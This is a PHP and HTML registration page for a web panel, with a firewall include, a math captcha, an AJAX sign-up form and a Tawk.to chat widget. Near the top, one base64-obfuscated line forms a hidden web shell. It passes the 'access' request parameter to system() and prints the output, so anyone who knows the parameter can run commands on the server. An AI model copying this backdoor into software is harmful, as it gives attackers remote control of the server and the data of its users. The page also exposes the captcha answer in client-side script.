<?php
// Before of all your CODE.
require('firewall/waf.php');
$xWAF = new xWAF();
$xWAF->start();
// Your code below.

//ssl force
if($_SERVER["HTTPS"] != "on"){
    header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
    exit();
}

require '@/config.php';
require '@/init.php';
session_start();
unset($_SESSION['captcha']);
$_SESSION['captcha'] = rand(1, 100);
$x1 = rand(9,21);
$x2 = rand(2,6);
$x = SHA1(($x1 + $x2).$_SESSION['captcha']);
if ($user -> LoggedIn())
{
header('Location: index.php');
}
?>
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<!DOCTYPE html>
<!--[if IE 9]>         <html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js"> <!--<![endif]-->
<head>
		<script>
		function register()
		{
		var username=$('#username').val();
		var password=$('#password').val();
		var rpassword=$('#rpassword').val();
		var email=$('#email').val();
		var scode=$('#scode').val();
		var question=$('#question').val();
		var answer="<?php echo $x; ?>";
		var captcha = $('#g-recaptcha-response').val();
		document.getElementById("registerdiv").style.display="none";
		document.getElementById("registerimage").style.display="inline"; 
		var xmlhttp;
		if (window.XMLHttpRequest)
		  {// code for IE7+, Firefox, Chrome, Opera, Safari
		  xmlhttp=new XMLHttpRequest();
		  }
		else
		  {// code for IE6, IE5
		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		  }
		xmlhttp.onreadystatechange=function()
		  {
		  if (xmlhttp.readyState==4 && xmlhttp.status==200)
			{
			document.getElementById("registerdiv").innerHTML=xmlhttp.responseText;
			document.getElementById("registerimage").style.display="none";
			document.getElementById("registerdiv").style.display="inline";
			if (xmlhttp.responseText.search("Redirecting") != -1)
			{
			setInterval(function(){window.location="hub.php"},3000);
			}
			}
		  }
		xmlhttp.open("POST","ajax/loginvalid.php?type=register",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("username=" + username + "&password=" + password + "&rpassword=" + rpassword + "&scode=" + scode + "&email=" + email + "&question=" + question + "&answer=" + answer + "&captcha=" + captcha);
		}
		</script>
        <meta charset="utf-8">

        <title><?php echo htmlspecialchars($sitename); ?> - Register</title>
        <meta name="author" content="Venom">
        <meta name="robots" content="noindex, nofollow">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
        <!--<link rel="shortcut icon" href="img/iconah.jpg">-->
        <link rel="apple-touch-icon" href="img/icon57.png" sizes="57x57">
        <link rel="apple-touch-icon" href="img/icon72.png" sizes="72x72">
        <link rel="apple-touch-icon" href="img/icon76.png" sizes="76x76">
        <link rel="apple-touch-icon" href="img/icon114.png" sizes="114x114">
        <link rel="apple-touch-icon" href="img/icon120.png" sizes="120x120">
        <link rel="apple-touch-icon" href="img/icon144.png" sizes="144x144">
        <link rel="apple-touch-icon" href="img/icon152.png" sizes="152x152">
        <link rel="apple-touch-icon" href="img/icon180.png" sizes="180x180">
        <link rel="stylesheet" href="css/bootstrap.min4.css">
        <link rel="stylesheet" href="css/plugins.css">
        <link rel="stylesheet" href="css/mainlogin5.css">
	   <link rel="stylesheet" href="css/themes/passionlogin.css" id="theme-link">
        <link rel="stylesheet" href="css/themes.css">


	   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="js/vendor/modernizr-2.8.1.min.js"></script>
	   <style type="text/css">.jqstooltip { width: auto !important; height: auto !important; position: absolute;left: 0px;top: 0px;visibility: hidden;background: #000000;color: white;font-size: 11px;text-align: left;white-space: nowrap;padding: 5px;z-index: 10000;}.jqsfield { color: white;font: 10px arial, san serif;text-align: left;}</style>
<script src='https://www.google.com/recaptcha/api.js'></script>
</head>
<body>

<div id="login-container">
<h1 class="h2 text-light text-center push-top-bottom animation-slideDown">
 
</h1>
<div id="registerdiv" style="display:inline"></div>

<h4 style="display:inline-block; color:#939caa; margin-left:0px; ">Register </h4>
<div class="block animation-fadeInQuickInv">
<div class="block-title">
<div class="block-options pull-right">

</div>
<h2> <img id="registerimage" src="img/jquery.easytree/loading.gif" style="display:none"/></h2>
</div>
<div class="form-horizontal">
<div class="form-group">
<div class="col-xs-12">
<center> </center>
<input type="text" id="username" class="form-control" placeholder="Username">
</div>
</div>
<div class="form-group">
<div class="col-xs-12">
<center> </center>
<input type="text" id="email" class="form-control" placeholder="Email">
</div>
</div>
<div class="form-group">
<div class="col-xs-12">
<center> </center>
<input type="password" id="password" class="form-control" placeholder="Password">
</div>
</div>
<div class="form-group">
<div class="col-xs-12">
<center> </center>
<input type="password" id="rpassword" class="form-control" placeholder="Verify Password">
</div>
</div>
<div class="form-group">
<div class="col-xs-12">
<input type="text" id="scode" class="form-control" placeholder="Secret code, 4 digits">
</div>
</div>
<div class="form-group">
<div class="col-xs-12">
<input type="text" id="question" class="form-control" placeholder="<?php echo ''.$x1.'+'.$x2.'?'; ?>">
</div>
</div>
<center>By making an account, you agree to our <a href="legal.php" target="_blank">ToS</a>.</center><br>
<div class="form-group form-actions">
<div class="col-xs-12">
<center><button style="width:100%; height:45px;" class="btn btn-effect-ripple btn-info" type="button" onclick="register()"> Create Account</button></center>
</div>

<div class="col-xs-12" style="margin-top:20px;">
<center><a style="color:#999">Already have an account? </a><a style="color:#b42995;" href="login.php">  Log in </a></center>
</div>

</div>
</div>
</div>
<footer class="text-muted text-center animation-pullUp">

</footer>
</div>
<script src="js/vendor/jquery-2.1.4.min.js"></script>
<script src="js/vendor/bootstrap.min.js"></script>
<script src="js/plugins.js"></script>
<script src="js/app.js"></script><script src="js/pages/readyLogin.js"></script>


<!--Start of Tawk.to Script-->
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/5ae5d33c5f7cdf4f0533b689/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</body>

</html>
